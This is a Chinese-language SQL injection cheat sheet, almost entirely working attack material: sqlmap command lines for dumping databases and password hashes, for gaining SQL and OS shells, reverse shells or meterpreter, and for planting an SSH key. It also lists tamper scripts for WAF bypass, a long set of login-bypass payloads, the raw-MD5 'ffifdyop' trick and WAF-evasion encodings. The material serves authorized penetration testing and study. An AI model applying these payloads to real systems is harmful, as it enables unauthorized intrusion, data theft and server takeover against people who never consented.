  #### 使用
	sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
	-p 指定注入点，注入参数
	--user-agent 指定user-agent
	--random-agent 随机user-agent
	--threads 线程
	--risk 风险等级 随着等级的增多，增加格式的测试语句
	--level 随着level变多，payload增加，运行时间增加，还会测试请求头的注入
	--eta 显示每个输出的预计完成时间
	--dbms 指定当前数据库类型
	--os 指定系统版本
	--banner 获取数据库管理系统的标识
	--is-dba 测试是否为dba权限
	--dbs 列出全部数据库
	--current-user 列出当前用户
	加载请求文件使用手机useragent
	sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
  #### 自定义注入点UserAgent/Header/Referer/Cookie
  	用*号指定注入点
	python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
  #### 二阶注入
  	python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
	sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
  #### shell
	SQL Shell
	python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell

	Simple Shell
	python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell

	Dropping a reverse-shell / meterpreter
	python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn

	SSH Shell by dropping an SSH key
	python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
  #### 使用 SQLmap 自动爬取网站和利用
	sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

	--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
	--crawl = how deep you want to crawl a site
	--forms = Parse and test forms
  #### 将 TOR 与 SQLmap 一起使用
	sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
  #### 代理
	sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
  #### 使用cookie 和代理
	sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
  #### 使用后缀篡改注入
	python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
  #### 使用tamper bypass waf
| Tamper | 描述 |
| --- | --- |
|0x2char.py | 用CONCAT(CHAR(),…) 替换每个 (MySQL) 0x<hex> 编码字符串 |
|apostrophemask.py | 用utf8代替引号 |
|apostrophenullencode.py | 绕过过滤双引号，替换字符和双引号|
|appendnullbyte.py | 在有效负荷结束位置加载零字节字符编码 |
|base64encode.py | Base64编码  |
|between.py | 用between替换大于号（>）|
|bluecoat.py | 代替空格字符后与一个有效的随机空白字符的SQL语句 然后替换=为like  |
|chardoubleencode.py | 双url编码(不处理已编码的) |
|charencode.py | url编码 |
|charunicodeencode.py | 字符串 unicode 编码 |
|charunicodeescape.py | unicode 转义 |
|commalesslimit.py | 无逗号|
|commalessmid.py |  'MID(A, B, C)' 替换为 'MID(A FROM B FOR C)'|
|commentbeforeparentheses.py | 括号前的注释 ( -> /**/() |
|concat2concatws.py | 'CONCAT(A, B)' 替换为 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | 字符编码  |
|charunicodeencode.py | unicode 编码 |
|equaltolike.py | 替换等号为like|
|escapequotes.py | 转义引号 |
|greatest.py | 用GREATEST替换大于号|
|halfversionedmorekeywords.py | 关键字前加注释 |
|htmlencode.py | HTML 编码 |
|ifnull2casewhenisnull.py | 将 'IFNULL(A, B)' 之类的实例替换为 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' | 
|ifnull2ifisnull.py | 用 'IF(ISNULL(A), B, A)' 替换像 'IFNULL(A, B)' 这样的实例|
|informationschemacomment.py | 在（MySQL）“information_schema”标识符的所有出现的末尾添加一个内联注释（/**/） |
|least.py | 将大于运算符 ('>') 替换为 'LEAST' 对应项 |
|lowercase.py | 用小写值替换每个关键字字符（例如 SELECT -> select） |
|modsecurityversioned.py | 包含带有版本化注释的完整查询|
|modsecurityzeroversioned.py | 包含带有零版本注释的完整查询 |
|multiplespaces.py | 在 SQL 关键字周围添加多个空格 |
|nonrecursivereplacement.py | 双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如  .replace（“SELECT”、”")） filters|
|overlongutf8.py | 转换给定有效负载中的所有字符|
|overlongutf8more.py | 将给定负载中的所有字符转换为超长 UTF8（例如 SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94） |
|percentage.py | 在每个字符前面添加一个百分号 ('%')  |
|plus2concat.py | 将加号运算符 ('+') 替换为 (MsSQL) 函数 CONCAT() 对应项 |
|plus2fnconcat.py | 将加号运算符 ('+') 替换为 (MsSQL) ODBC 函数 {fn CONCAT()} 对应项 |
|randomcase.py | 用随机大小写值替换每个关键字字符 |
|randomcomments.py | 为 SQL 关键字添加随机注释|
|securesphere.py |附加特殊制作的字符串 |
|sp_password.py |  将“sp_password”附加到有效负载的末尾，以便从 DBMS 日志中自动混淆 |
|space2comment.py | 用注释替换空格字符 (' ') |
|space2dash.py | 用破折号注释 ('--') 后跟随机字符串和换行符 ('\n') 替换空格字符 ('') |
|space2hash.py | 将空格字符 (' ') 替换为井号字符 ('#')，后跟随机字符串和换行符 ('\n') |
|space2morehash.py | 将空格字符 (' ') 替换为井号字符 ('#')，后跟随机字符串和换行符 ('\n') |
|space2mssqlblank.py | 用一组有效替代字符中的随机空白字符替换空格字符 (' ') |
|space2mssqlhash.py | 用井号字符 ('#') 后跟换行符 ('\n') 替换空格字符 ('')|
|space2mysqlblank.py | 用一组有效替代字符中的随机空白字符替换空格字符 (' ') |
|space2mysqldash.py | 用破折号注释 ('--') 后跟换行符 ('\n') 替换空格字符 ('') |
|space2plus.py |  将空格字符 (' ') 替换为加号 ('+')  |
|space2randomblank.py | 用一组有效替代字符中的随机空白字符替换空格字符 (' ') |
|symboliclogical.py | 将 AND 和 OR 逻辑运算符替换为对应的符号（&& 和||） |
|unionalltounion.py | 将 UNION ALL SELECT 替换为 UNION SELECT |
|unmagicquotes.py | 将引号字符 (') 替换为多字节组合 %bf%27 以及末尾的通用注释 |
|uppercase.py | 用大写值“INSERT”替换每个关键字字符|
|varnish.py | 附加 HTTP 标头“X-originating-IP” |
|versionedkeywords.py | 用版本化 MySQL 注释将每个非函数关键字括起来 |
|versionedmorekeywords.py | 用版本化的 MySQL 注释将每个关键字括起来 |
|xforwardedfor.py | 附加一个虚假的 HTTP 标头“X-Forwarded-For”|

  #### 使用账户密码访问数据库
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
  #### 身份验证绕过 - 万能账户密码
	'-'
	' '
	'&'
	'^'
	'*'
	' or 1=1 limit 1 -- -+
	'="or'
	' or ''-'
	' or '' '
	' or ''&'
	' or ''^'
	' or ''*'
	'-||0'
	"-||0"
	"-"
	" "
	"&"
	"^"
	"*"
	'--'
	"--"
	'--' / "--"
	" or ""-"
	" or "" "
	" or ""&"
	" or ""^"
	" or ""*"
	or true--
	" or true--
	' or true--
	") or true--
	') or true--
	' or 'x'='x
	') or ('x')=('x
	')) or (('x'))=(('x
	" or "x"="x
	") or ("x")=("x
	")) or (("x"))=(("x
	or 2 like 2
	or 1=1
	or 1=1--
	or 1=1#
	or 1=1/*
	admin' --
	admin' -- -
	admin' #
	admin'/*
	admin' or '2' LIKE '1
	admin' or 2 LIKE 2--
	admin' or 2 LIKE 2#
	admin') or 2 LIKE 2#
	admin') or 2 LIKE 2--
	admin') or ('2' LIKE '2
	admin') or ('2' LIKE '2'#
	admin') or ('2' LIKE '2'/*
	admin' or '1'='1
	admin' or '1'='1'--
	admin' or '1'='1'#
	admin' or '1'='1'/*
	admin'or 1=1 or ''='
	admin' or 1=1
	admin' or 1=1--
	admin' or 1=1#
	admin' or 1=1/*
	admin') or ('1'='1
	admin') or ('1'='1'--
	admin') or ('1'='1'#
	admin') or ('1'='1'/*
	admin') or '1'='1
	admin') or '1'='1'--
	admin') or '1'='1'#
	admin') or '1'='1'/*
	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
	admin" --
	admin';-- azer 
	admin" #
	admin"/*
	admin" or "1"="1
	admin" or "1"="1"--
	admin" or "1"="1"#
	admin" or "1"="1"/*
	admin"or 1=1 or ""="
	admin" or 1=1
	admin" or 1=1--
	admin" or 1=1#
	admin" or 1=1/*
	admin") or ("1"="1
	admin") or ("1"="1"--
	admin") or ("1"="1"#
	admin") or ("1"="1"/*
	admin") or "1"="1
	admin") or "1"="1"--
	admin") or "1"="1"#
	admin") or "1"="1"/*
	1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
  #### 身份验证绕过（原始 MD5 SHA1）
  	当密码为MD5加密是
	查询语句是这样的
	"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
	绕过方式
	md5("ffifdyop", true) = 'or'6�]��!r,��b�
	sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
  #### WAF 绕过
  	无空格
	?id=1%09and%091=1%09--
	?id=1%0Dand%0D1=1%0D--
	?id=1%0Cand%0C1=1%0C--
	?id=1%0Band%0B1=1%0B--
	?id=1%0Aand%0A1=1%0A--
	?id=1%A0and%A01=1%A0--
	注释符
	?id=1/*comment*/and/**/1=1/**/--
	括号绕过
	?id=(1)and(1)=(1)--
	更多
| DBMS | ASCII characters in hexadicimal |
| ---- | ------------------------------- |
| SQLite3 | 0A, 0D, 0C, 09, 20 |
| MySQL	5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
| MySQL	3	| 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20 |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
| MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
	无逗号
	LIMIT 0,1         -> LIMIT 1 OFFSET 0
	SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
	SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
	无等号
	?id=1 and substring(version(),1,1)like(5)
	?id=1 and substring(version(),1,1)not in(4,3)
	?id=1 and substring(version(),1,1)in(4,3)
	?id=1 and substring(version(),1,1) between 3 and 4
	大小写
	?id=1 AND 1=1#
	?id=1 AnD 1=1#
	?id=1 aNd 1=1#
	运算符
	AND   -> &&
	OR    -> ||
	=     -> LIKE,REGEXP, BETWEEN, not < and not >
	> X   -> not between 0 and X
	WHERE -> HAVING
